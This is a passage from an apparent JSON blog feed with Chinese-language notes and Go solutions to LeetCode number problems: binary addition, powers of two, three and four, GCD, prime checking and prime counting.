punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"7-二进制求和\"><a class=\"anchor\" href=\"#7-二进制求和\">#</a> 7. 二进制求和</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9hZGQtYmluYXJ5L2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/add-binary/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzIvdG9waWNfMi5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_2/topic_2.go</span></p>\n<blockquote>\n<p>给你两个二进制字符串  <code>a</code>  和  <code>b</code>  ，以二进制字符串的形式返回它们的和。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">addBinary</span><span class=\"token punctuation\">(</span>a <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> b <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tindexA<span class=\"token punctuation\">,</span> indexB <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> indexA <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> b</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> indexB <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> a</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tcarry <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">for</span> indexA <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> indexB <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> indexA <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\tcarry <span class=\"token operator\">+=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>indexA<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token char\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> indexB <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\tcarry <span class=\"token operator\">+=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">[</span>indexB<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token char\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tans <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">,</span> <span class=\"token function\">byte</span><span class=\"token punctuation\">(</span><span class=\"token char\">'0'</span><span class=\"token operator\">+</span>carry<span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\tcarry <span class=\"token operator\">=</span> carry <span class=\"token operator\">/</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\tindexA<span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\tindexB<span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">if</span> carry <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\tans <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">,</span> <span class=\"token char\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\tans<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> ans<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ans<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> ans<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"幂运算\"><a class=\"anchor\" href=\"#幂运算\">#</a> 幂运算</h2>\n<h3 id=\"8-判断-2的幂\"><a class=\"anchor\" href=\"#8-判断-2的幂\">#</a> 8. 判断 2 的幂</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9wb3dlci1vZi10d28vZGVzY3JpcHRpb24v\">https://leetcode.cn/problems/power-of-two/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzIvdG9waWNfMy5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_2/topic_3.go</span></p>\n<blockquote>\n<p>给你一个整数  <code>n</code> ，请你判断该整数是否是 2 的幂次方。如果是，返回  <code>true</code>  ；否则，返回  <code>false</code>  。</p>\n<p>如果存在一个整数  <code>x</code>  使得  <code>n == 2x</code>  ，则认为  <code>n</code>  是 2 的幂次方。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 1000</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 0111</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isPowerOfTwo</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">return</span> n <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> n<span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"9-判断-3的幂\"><a class=\"anchor\" href=\"#9-判断-3的幂\">#</a> 9. 判断 3 的幂</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9wb3dlci1vZi10aHJlZS9kZXNjcmlwdGlvbi8=\">https://leetcode.cn/problems/power-of-three/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzIvdG9waWNfNC5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_2/topic_4.go</span></p>\n<blockquote>\n<ul>\n<li>给定一个整数，写一个函数来判断它是否是 3 的幂次方。如果是，返回  <code>true</code>  ；否则，返回  <code>false</code>  。</li>\n</ul>\n<p>整数  <code>n</code>  是 3 的幂次方需满足：存在整数  <code>x</code>  使得  <code>n == 3x</code></p>\n<p>在 32 位有符号整数的范围内，最大的 3 的幂次方是 $3^{19} = 1162261467</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isPowerOfThree</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">// n, i := 1, 0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// for n &lt; math.MaxInt32 &#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// \tn = int(math.Pow(3, float64(i)))</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token comment\">// \ti++</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">// \tfmt.Println(i, n)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">// &#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// return true</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">return</span> n <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token number\">1162261467</span><span class=\"token operator\">%</span>n <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"10-判断-4的幂\"><a class=\"anchor\" href=\"#10-判断-4的幂\">#</a> 10. 判断 4 的幂</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9wb3dlci1vZi1mb3VyL2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/power-of-four/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzIvdG9waWNfNS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_2/topic_5.go</span></p>\n<blockquote>\n<p>给定一个整数，写一个函数来判断它是否是 4 的幂次方。如果是，返回  <code>true</code>  ；否则，返回  <code>false</code>  。</p>\n<p>整数  <code>n</code>  是 4 的幂次方需满足：存在整数  <code>x</code>  使得  <code>n == 4x</code></p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isPowerOfFour</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">//      1\t1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">//    100\t4</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">//  10000\t16</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token comment\">//1000000\t64</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> n <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> n<span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> n<span class=\"token operator\">&amp;</span><span class=\"token number\">0xaaaaaaaa</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"最大公约数\"><a class=\"anchor\" href=\"#最大公约数\">#</a> 最大公约数</h2>\n<h3 id=\"11-最大公约数\"><a class=\"anchor\" href=\"#11-最大公约数\">#</a> 11. 最大公约数</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzMvdG9waWNfMS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_3/topic_1.go</span></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 辗转相除法 (欧几里得算法)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 求最大公约数 GCD (Greatest Common Divisor)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// eg1:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 12，18 的公因数有：1，2，3，6。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// gcd（12，18）=gcd(18,12%18)=gcd(18,12)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// gcd（18，12）=gcd(12,18%12)=gcd(12,6)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// gcd（12，6）=gcd(6,12%6)=gcd(6,0)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// return 6</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">gcd</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tk <span class=\"token operator\">:=</span> a <span class=\"token operator\">%</span> b</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\ta<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> b<span class=\"token punctuation\">,</span> k</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">for</span> k <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tk <span class=\"token operator\">=</span> a <span class=\"token operator\">%</span> b</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\ta<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> b<span class=\"token punctuation\">,</span> k</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">return</span> a</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"质数和合数\"><a class=\"anchor\" href=\"#质数和合数\">#</a> 质数和合数</h2>\n<h3 id=\"12-判断质数\"><a class=\"anchor\" href=\"#12-判断质数\">#</a> 12. 判断质数</h3>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isPrime</span><span class=\"token punctuation\">(</span>num <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tmax <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sqrt</span><span class=\"token punctuation\">(</span><span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> num<span class=\"token operator\">%</span>i <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"13-计算质数数量\"><a class=\"anchor\" href=\"#13-计算质数数量\">#</a> 13. 计算质数数量</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9jb3VudC1wcmltZXMv\">https://leetcode.cn/problems/count-primes/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzMvdG9waWNfMy5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_3/topic_3.go</span></p>\n<blockquote>\n<p>给定整数  <code>n</code>  ，返回 <em>所有小于非负整数  <code>n</code>  的质数的数量</em> 。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">countPrimes</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tprimeList <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>primeList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\tans <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> i<span class=\"token operator\">*</span>i <span class=\"token operator\">&lt;</span> n <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">for</span> j <span class=\"token operator\">:=</span> i <span class=\"token operator\">*</span> i<span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> j <span class=\"token operator\">+=</span> i <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t\t\tprimeList<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token keyword\">return</span> ans</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "算法训练2023",
                "数据结构",
                "算法"
            ]
        }
    ]
}